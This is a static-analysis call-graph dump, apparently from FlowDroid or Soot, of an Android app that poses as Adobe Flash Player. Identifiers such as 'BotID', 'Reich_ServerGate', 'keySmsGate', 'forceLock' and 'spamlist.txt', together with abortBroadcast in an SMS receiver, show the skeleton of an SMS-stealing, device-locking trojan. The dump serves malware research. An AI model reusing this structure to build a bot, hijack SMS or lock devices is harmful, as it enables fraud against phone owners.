VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.Window getWindow()>() in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: android.view.Window getWindow()>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("getContacts") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.packages.BK: void onCreate(android.os.Bundle)>(null) in <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)> ==> <com.adobe.packages.BK: void onCreate(android.os.Bundle)>
VIRTUAL edge: r30 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r42 = staticinvoke <java.lang.Long: java.lang.Long valueOf(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Long: java.lang.Long valueOf(java.lang.String)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r6 = specialinvoke r0.<com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)>("lockd", $r1) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
STATIC edge: $r9 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r9) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.Object getSystemService(java.lang.String)>("phone") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.content.ContextWrapper: java.lang.Object getSystemService(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "spamlist.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(";") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("forceZ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r12) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", $r24, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String valueOf(long)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("forceLock") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r4) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("setFilter[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r24.<java.lang.String: int length()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int length()>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAData", "User haven\'t accounts.", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r2.<android.content.Intent: void <init>(java.lang.String)>("android.settings.SETTINGS") in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <android.content.Intent: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke r4.<java.lang.StringBuffer: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.String toString()>
VIRTUAL edge: $i0 = virtualinvoke $r11.<java.lang.String: int indexOf(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r4.<java.lang.StringBuffer: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.String toString()>
SPECIAL edge: specialinvoke r2.<java.io.BufferedReader: void <init>(java.io.Reader)>(r3) in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
STATIC edge: $r20 = staticinvoke <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.SystemSWF: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.SystemSWF: android.content.Intent getIntent()>
VIRTUAL edge: $r20 = virtualinvoke $r20.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.AdobeUtil: android.os.IBinder onBind(android.content.Intent)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: android.os.IBinder onBind(android.content.Intent)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", "*", $r2) in <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
CLINIT edge: staticinvoke <android.view.WindowManager$LayoutParams: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.view.WindowManager$LayoutParams: void <clinit>()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String valueOf(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent addFlags(int)>(67108864) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent addFlags(int)>
SPECIAL edge: $r6 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: r34 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeZCore: void onCreate()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: void onCreate()>
STATIC edge: $i5 = staticinvoke <java.lang.Integer: int parseInt(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Integer: int parseInt(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: staticinvoke <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>($r3, "Reich_ServerGate", $r4) in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>($r3, "BotLocation", $r4) in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $z0 = virtualinvoke r3.<java.io.File: boolean isFile()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: boolean isFile()>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("stop") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r4 = virtualinvoke $r6.<com.adobe.flashplayer.Certificate: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r34 = interfaceinvoke r5.<java.util.Map: java.util.Set keySet()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.TreeMap: java.util.Set keySet()>
SPECIAL edge: specialinvoke $r59.<com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>($r38, "ON") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <android.content.ComponentName: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.content.ComponentName: void <clinit>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("keySmsGate") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void abortBroadcast()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void abortBroadcast()>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent setFlags(int)>(1073741824) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onCreate(android.os.Bundle)>($r1) in <com.adobe.packages.BK: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onCreate(android.os.Bundle)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.AdobeFlashCore: void <init>()> ==> <android.app.Service: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>(r4, "out.txt", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
